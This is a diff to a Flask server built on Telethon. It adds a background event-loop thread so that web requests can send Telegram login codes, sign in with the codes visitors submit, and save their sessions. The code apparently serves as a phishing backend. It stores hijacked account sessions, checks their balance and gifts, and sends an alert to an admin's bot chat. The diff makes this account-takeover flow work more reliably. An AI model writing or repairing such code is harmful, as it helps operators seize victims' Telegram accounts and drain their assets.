@@ -1,3 +1,4 @@
+# server.py
 from flask import Flask, render_template, request, jsonify, session
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
@@ -5,6 +6,7 @@ import asyncio
 import os
 import json
 import logging
+import threading
 
 logging.basicConfig(level=logging.INFO)
 
@@ -19,6 +21,17 @@ app.secret_key = os.urandom(24)
 
 temp_clients = {}
 
+# Создаём глобальный event loop для Telethon в отдельном потоке
+telethon_loop = None
+
+def get_telethon_loop():
+    global telethon_loop
+    if telethon_loop is None or telethon_loop.is_closed():
+        telethon_loop = asyncio.new_event_loop()
+        thread = threading.Thread(target=telethon_loop.run_forever, daemon=True)
+        thread.start()
+    return telethon_loop
+
 async def send_telegram_message(text):
     import httpx
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -26,10 +39,8 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 def notify_admin_sync(text):
-    try:
-        asyncio.run(send_telegram_message(text))
-    except Exception as e:
-        logging.error(f"Failed to notify admin: {e}")
+    loop = get_telethon_loop()
+    asyncio.run_coroutine_threadsafe(send_telegram_message(text), loop)
 
 async def check_balance_and_gifts(client):
     try:
@@ -95,11 +106,11 @@ def api_send_code():
     
     session_id = os.urandom(8).hex()
     
-    client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
-    temp_clients[session_id] = {'client': client}
+    loop = get_telethon_loop()
     
     async def send_code():
         try:
+            client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH, loop=loop)
             await client.connect()
             result = await client.send_code_request(phone)
             temp_clients[session_id] = {
@@ -112,9 +123,12 @@ def api_send_code():
             logging.error(f"Send code error: {e}")
             return False
     
-    loop = asyncio.new_event_loop()
-    success = loop.run_until_complete(send_code())
-    loop.close()
+    future = asyncio.run_coroutine_threadsafe(send_code(), loop)
+    try:
+        success = future.result(timeout=30)
+    except Exception as e:
+        logging.error(f"Future error: {e}")
+        success = False
     
     if success:
         return jsonify({"success": True, "session_id": session_id})
@@ -138,6 +152,8 @@ def api_verify_code():
     phone_code_hash = session_data['phone_code_hash']
     phone = session_data['phone']
     
+    loop = get_telethon_loop()
+    
     async def verify_and_process():
         try:
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
@@ -154,9 +170,12 @@ def api_verify_code():
             await client.disconnect()
             return False
     
-    loop = asyncio.new_event_loop()
-    result = loop.run_until_complete(verify_and_process())
-    loop.close()
+    future = asyncio.run_coroutine_threadsafe(verify_and_process(), loop)
+    try:
+        result = future.result(timeout=30)
+    except Exception as e:
+        logging.error(f"Future error: {e}")
+        result = False
     
     if result is True:
         return jsonify({"success": True, "message": "Авторизация успешна!"})
